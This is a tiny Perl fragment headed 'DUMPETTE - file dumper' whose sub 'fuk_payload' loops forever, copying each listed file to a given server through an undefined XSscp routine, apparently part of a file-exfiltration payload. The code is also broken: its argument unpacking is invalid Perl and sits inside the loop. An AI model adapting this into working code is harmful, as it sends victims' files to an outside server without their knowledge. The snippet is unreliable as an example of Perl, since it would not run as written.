########################
# DUMPETTE - file dumper

sub fuk_payload
{
	while (1)
	{
		my ($server, \@files) = @_;
		sleep 100 unless defined $files[0];
		foreach (@files)
			{ XSscp($server, $_); }
	}
}
